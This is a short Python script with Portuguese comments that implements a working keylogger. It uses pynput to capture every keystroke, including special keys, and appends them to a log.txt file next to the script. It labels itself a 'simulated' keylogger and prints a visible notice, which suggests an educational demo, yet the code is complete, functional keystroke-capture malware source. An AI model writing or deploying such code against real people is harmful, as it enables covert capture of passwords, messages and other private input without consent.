import os
from pynput import keyboard

# Define o diretório onde o log será guardado (junto ao script)
diretorio_atual = os.path.dirname(os.path.abspath(__file__))
arquivo_log = os.path.join(diretorio_atual, "log.txt")


def ao_pressionar_tecla(tecla):
    try:
        # Tenta capturar o caractere normal digitado
        caractere = tecla.char
    except AttributeError:
        # Se for uma tecla especial (espaço, enter, shift, etc.), formata o nome
        caractere = f" [{tecla.name}] "

    # Escreve o caractere capturado no arquivo de texto local
    with open(arquivo_log, "a", encoding="utf-8") as f:
        f.write(str(caractere) if caractere else " ")


def iniciar_keylogger():
    print(f"[*] Keylogger simulado ativo. A gravar teclas em: {arquivo_log}")
    print("[*] Pressione 'Ctrl + C' no terminal para interromper a captura.")

    # Inicia o listener (escuta o teclado em segundo plano)
    with keyboard.Listener(on_press=ao_pressionar_tecla) as listener:
        listener.join()


if __name__ == "__main__":
    iniciar_keylogger()
